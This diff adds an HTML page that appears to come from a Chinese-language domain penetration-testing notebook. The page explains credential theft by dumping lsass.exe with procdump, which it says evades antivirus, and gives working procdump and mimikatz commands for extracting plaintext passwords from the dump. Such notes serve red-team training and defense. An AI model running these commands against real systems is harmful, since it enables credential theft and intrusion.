@@ -1,0 +1,28 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
+			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
+			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h3 class="cs868C439D">
+			<a name="X279de1a12b17f87541c4ce8df0d3bd0a23ed8a3"><span class="csD1E291E2">4.1.2 procdump+mimikatz</span></a></h3>
+		<p class="cs40DD2BC9"><span class="cs8926E06">Procdump </span><span class="cs9C1B1871">是微软官方发布的一款调试工具，因此不会被各种杀毒软件查杀。可使用</span><span class="cs8926E06"> procdump </span><span class="cs9C1B1871">加</span><span class="cs8926E06"> mimikatz </span><span class="cs9C1B1871">来躲避杀软检测。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">官方下载地址</span><span class="cs8926E06">:<a class="cs508254C" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump"><span class="cs4B51D5E4">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</span></a></span></p><h4 class="cs868C439D">
+			<a name="Xe3bf53660fb237c7aa4f842982aa75b8b304ff8"><span class="csBF12A472">1</span><span class="cs6EDCDAE2">、使用</span><span class="csBF12A472"> procdump </span><span class="cs6EDCDAE2">将目标的</span><span class="csBF12A472"> lsass.exe </span><span class="cs6EDCDAE2">转储成</span><span class="csBF12A472"> dmp </span><span class="cs6EDCDAE2">文件</span></a></h4>
+		<p class="cs3A447A38"><span class="cs9FB05234">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span></p><p class="cs40DD2BC9"><span><img src="域渗透/4、域内横向移动/4.1_凭据窃取/4.1.2%20procdump+mimikatz_files/image0.png" width="560" height="304" alt="" style="border-width:0px;" /></span></p><h4 class="cs868C439D">
+			<a name="X077b0764f304952508dbdd2e640fb762bb77bff"><span class="csBF12A472">2</span><span class="cs6EDCDAE2">、使用</span><span class="csBF12A472"> mimikatz </span><span class="cs6EDCDAE2">从转储的</span><span class="csBF12A472"> lsass.dmp </span><span class="cs6EDCDAE2">中来读取明文密码</span></a></h4>
+		<p class="cs3A447A38"><span class="cs9FB05234">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;</span></p><p class="cs40DD2BC9"><span class="cs8926E06">image</span></p></body>
+</html>
